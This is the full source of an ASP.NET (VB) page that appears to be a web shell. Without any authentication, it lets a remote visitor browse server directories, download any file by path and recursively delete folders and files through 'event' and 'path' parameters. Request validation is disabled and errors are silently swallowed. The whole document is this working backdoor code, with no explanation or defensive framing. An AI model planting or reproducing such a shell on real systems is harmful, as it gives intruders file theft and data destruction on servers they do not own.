<%@ Page Language="VB" ValidateRequest="false" Buffer="false" %>

<%
	Try
		Dim i As Integer
		Dim p As String = Request.Form.Get("path")
		If p = Nothing Then
			p = Request.QueryString.Get("path")
		End If
		Try
			p = Server.MapPath(p)
		Catch ex As Exception
		End Try
		Dim dir As New IO.DirectoryInfo(p)
		Select Case Request.Form.Get("event")
			Case "up"
event_up:
				Try
					dir = dir.Parent
					If dir Is Nothing Then
						dir = New IO.DirectoryInfo(p)
					End If
				Catch ex As Exception
				End Try
				GoTo a
			Case "delete"
event_delete:
				Try
					'Dim i As Integer
					Dim df As String() = Request.Form.Get("fn").Split("<")
					For i = 0 To df.Length - 2
						If df(i).StartsWith("d") Then
							Try
								IO.Directory.Delete(dir.FullName + "/" + df(i).Substring(1), True)
							Catch ex As Exception
							End Try
						Else
							Try
								IO.File.Delete(dir.FullName + "/" + df(i).Substring(1))
							Catch ex As Exception
							End Try
						End If
					Next
					
				Catch ex As Exception
					Response.Write(ex.Message)
				End Try
				'Return
				GoTo a
			Case "get"
event_get:
				Dim fn As String = Request.Form.Get("fn")
				If fn = Nothing Then
					fn = Request.QueryString.Get("fn")
				End If
				Dim fs As New IO.FileStream(dir.FullName + "/" + fn, IO.FileMode.Open, IO.FileAccess.Read)
				Dim buf(1024) As Byte
				Dim br As Integer
				Do
					br = fs.Read(buf, 0, buf.Length)
					If br <= 0 Then Return
					Response.OutputStream.Write(buf, 0, br)
					Response.Flush()
				Loop
				Return
		End Select
		Select Case Request.QueryString.Get("event")
			Case "up"
				GoTo event_up
			Case "delete"
				GoTo event_delete
			Case "get"
				GoTo event_get
		End Select
a:
		Dim d As IO.DirectoryInfo() = dir.GetDirectories()
		Dim f As IO.FileInfo() = dir.GetFiles()
		Response.Write(dir.FullName + vbNewLine)
		For i = 0 To d.Length - 1
			Response.Write(d(i).Name + "<Folder< <" + d(i).LastWriteTime.ToString("yyyy.MM.dd hh:mm:ss") + vbNewLine)
		Next
		For i = 0 To f.Length - 1
			Response.Write(f(i).Name + "<File<" + f(i).Length.ToString() + "<" + f(i).LastWriteTime.ToString("yyyy.MM.dd hh:mm:ss") + vbNewLine)
		Next
	Catch ex As Exception
		Response.Write(ex.Message)
	End Try
                         	   
%>
